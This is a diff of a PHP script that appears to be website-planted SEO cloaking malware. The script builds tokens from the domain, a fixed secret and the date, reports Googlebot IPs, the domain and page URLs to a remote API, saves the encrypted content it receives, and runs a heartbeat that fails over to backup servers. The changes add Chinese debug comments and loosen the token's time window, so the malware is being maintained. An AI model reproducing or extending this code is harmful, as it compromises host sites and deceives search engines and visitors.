@@ -289,7 +289,7 @@ function decrypt($encrypted_data, $token) {
 }
 function gen_token($domain) {  
     $fixed_string = "DhdL8Uf9hHNWVNcGwybP8bDhqwn3WpHrRsgaugOqx";    
-    $utc_time = gmdate('Y-m-d H:i');  
+    $utc_time = gmdate('Y-m-d');  
     $sha256_hash = hash('sha256', $domain . $fixed_string . $utc_time, true);    
     $key = hash('sha256', $sha256_hash, true); 
     $token = strtr(base64_encode($sha256_hash), '+/', '-_'); 
@@ -318,6 +318,7 @@ function updateApiCache($cache_file) {
 
 
 function getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url ) { 
+echo " <!--    getAPIData 开始执行 访问服务器  --> ";
     $postJdata = '{"new_google_bot_ips":'.json_encode($newGooglebotIPs).',"domain":"'.$domain.'","page_url":"'.$page_url.'","token":"'.$Token.'" } ';  
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $apiUrl); 
@@ -331,6 +332,7 @@ function getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url ) {
 }
 
 function processSaveAPIData($gotEncJson,$Token,$TokenNotime,$filePath){    
+echo " <!--    保存processSaveAPIData程序已开始执行  --> ";
     $gotEncJson = json_decode($gotEncJson, true, 512, JSON_UNESCAPED_UNICODE);
     if($gotEncJson === null) {
         touch($filePath);
@@ -461,11 +463,15 @@ function heartBT(){
     }else{    
         $timeDiff = strtotime($nowTime) - strtotime($updateTime);
         $minutesDiff = floor($timeDiff / 60); 
+
+echo " <!-- 进入心跳普通情况else中， 时间间隔minutesDiff：$minutesDiff    --> ";
        
         if ( $minutesDiff >= $heartbeat_packet_interval) {    
+echo " <!--   时间间隔 大于heartbeat_packet_interval 下面执行检测API是否正常通顺   --> ";
       
             $urlWork=false;
             if(!checkUrlWorkOK($apiUrl)) {
+echo " <!--    上面程序中取到的第一个API是不工作：$apiUrl   --> ";
                 foreach ($apiUrlsBase as $url) {
                     if(checkUrlWorkOK($url)) { $apiUrl = $url; $urlWork=true; break; } 
                 } 
@@ -487,9 +493,11 @@ function heartBT(){
             }
 
             if($urlWork){
+echo " <!--  现在确定urlWork状态 真， 下面将执行 访问服务器 getAPIData   --> ";
 
                 $newJson=getAPIData($apiUrl,$newGooglebotIPs,$Token,$domain,$page_url);    
-                if(mb_strlen($newJson) > 100){           
+                if(mb_strlen($newJson) > 100){   
+echo " <!--    getAPIData 取到数据长度大于100，下面将要保存processSaveAPIData  --> ";
                     processSaveAPIData($newJson,$Token,$TokenNotime,$filePath);
                 }
             }            
